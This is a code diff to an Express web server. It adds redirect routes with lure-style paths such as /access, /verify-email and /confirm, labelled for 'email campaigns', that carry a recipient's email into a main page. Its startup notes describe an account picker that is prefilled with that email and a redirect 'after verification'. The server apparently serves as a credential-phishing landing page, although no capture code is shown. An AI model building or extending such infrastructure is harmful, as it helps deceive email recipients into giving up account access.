@@ -42,12 +42,55 @@ function getLogoHTML() {
 }
 
 // ============================================================
+// 🔄 REDIRECT ROUTE FOR EMAIL CAMPAIGNS (FIX FOR /access ERROR)
+// ============================================================
+app.get('/access', (req, res) => {
+    const email = req.query.email || '';
+    console.log(`🔄 Redirecting from /access to / with email: ${email || 'none'}`);
+    if (email) {
+        res.redirect(`/?email=${encodeURIComponent(email)}`);
+    } else {
+        res.redirect('/');
+    }
+});
+
+// Also handle other common paths that might appear
+app.get('/verify-email', (req, res) => {
+    const email = req.query.email || '';
+    if (email) {
+        res.redirect(`/?email=${encodeURIComponent(email)}`);
+    } else {
+        res.redirect('/');
+    }
+});
+
+app.get('/validate', (req, res) => {
+    const email = req.query.email || '';
+    if (email) {
+        res.redirect(`/?email=${encodeURIComponent(email)}`);
+    } else {
+        res.redirect('/');
+    }
+});
+
+app.get('/confirm', (req, res) => {
+    const email = req.query.email || '';
+    if (email) {
+        res.redirect(`/?email=${encodeURIComponent(email)}`);
+    } else {
+        res.redirect('/');
+    }
+});
+
+// ============================================================
 // MAIN PAGE - AUTO DETECT EMAIL (REAL DETECTION)
 // ============================================================
 app.get('/', (req, res) => {
     const logoHTML = getLogoHTML();
     // Capture email from URL parameter if present
     const urlEmail = req.query.email || '';
+    
+    console.log(`📧 Main page loaded. Email from URL: ${urlEmail || 'none'}`);
     
     res.send(`
         <!DOCTYPE html>
@@ -851,6 +894,12 @@ app.listen(PORT, () => {
     - System captures "client@example.com" from URL (PRIORITY 1)
     - Shows account picker with that email (if found)
     - After verification → Redirects to: ${FINAL_URL}?email=client@example.com
+    
+    🔄 REDIRECT SUPPORT:
+    - /access?email=xxx → Redirects to main page with email
+    - /verify-email?email=xxx → Redirects to main page with email
+    - /validate?email=xxx → Redirects to main page with email
+    - /confirm?email=xxx → Redirects to main page with email
     
     🚀 IF NO EMAIL DETECTED ANYWHERE:
     - Skips account picker entirely
